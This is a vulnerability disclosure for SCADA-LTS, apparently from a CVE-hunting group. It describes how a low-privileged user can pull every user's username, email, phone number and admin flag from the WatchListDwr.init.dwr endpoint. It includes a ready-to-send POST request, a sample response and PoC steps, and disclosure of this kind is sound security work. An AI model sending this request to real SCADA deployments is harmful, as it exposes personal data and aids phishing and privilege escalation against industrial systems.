# Sensitive User Information Disclosure via `WatchListDwr.init.dwr` Endpoint

### Summary

A vulnerability was identified in the `WatchListDwr.init.dwr` endpoint of SCADA-LTS that allows any authenticated user, even with minimal permissions, to access sensitive user information including usernames, emails, phone numbers, and admin status. This flaw constitutes an **Information Disclosure** issue and could be used to facilitate further attacks such as phishing, privilege escalation, or social engineering.

### Details

- **Vulnerable Endpoint:** `POST /Scada-LTS/dwr/call/plaincall/WatchListDwr.init.dwr`  
- **Authentication Required:** Yes (low-privileged user)  
- **Affected Parameter:** N/A (static DWR call)  
- **Impact Type:** Information Disclosure

By issuing a crafted POST request to the vulnerable endpoint, a low-privileged user is able to retrieve detailed information of all users in the system. The backend responds with a full JavaScript object containing data such as usernames, emails, admin flags, and phone numbers.

#### Sample Request:
````
POST /Scada-LTS/dwr/call/plaincall/WatchListDwr.init.dwr HTTP/1.1
Host: kubernetes.docker.internal:8080
Content-Type: text/plain

callCount=1
page=/Scada-LTS/watch_list.shtm
httpSessionId=
scriptSessionId=XYZ123456789
c0-scriptName=WatchListDwr
c0-methodName=init
c0-id=0
batchId=1
````

#### Sample Response Snippet:

````
javascript
s7.admin=true;
s7.email="admin@yourMangoDomain.com";
s7.username="admin";

s8.admin=false;
s8.email="anonymous@mail.com";
s8.username="anonymous";

s11.admin=false;
s11.email="user1@x.com";
s11.phone="13212313131";
s11.username="user1";

````

### Proof of Concept (PoC)

1. Authenticate as any valid low-privileged user.
![image](/images/disclousure002.png)
2. Send the above POST request to `/Scada-LTS/dwr/call/plaincall/WatchListDwr.init.dwr`.
![image](/images/disclousure001.png)
3. Observe the server response containing sensitive information of all users in the SCADA system.

### Impact
- Privacy Violation: Emails, phone numbers, and usernames of all users, including administrators, are exposed.

- Privilege Escalation Support: Knowledge of admin usernames and roles could be leveraged in further attacks.

- Phishing and Social Engineering: Exposed contact information can be used to craft highly targeted attacks.

- Reconnaissance: Attackers can map the user structure of the SCADA-LTS system for further exploitation.

# References

[SCADA-LTS – Official Repository](https://github.com/SCADA-LTS/Scada-LTS)

# Discoverer

[Natan Maia Morette](https://nmmorette.github.io) 

by [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)

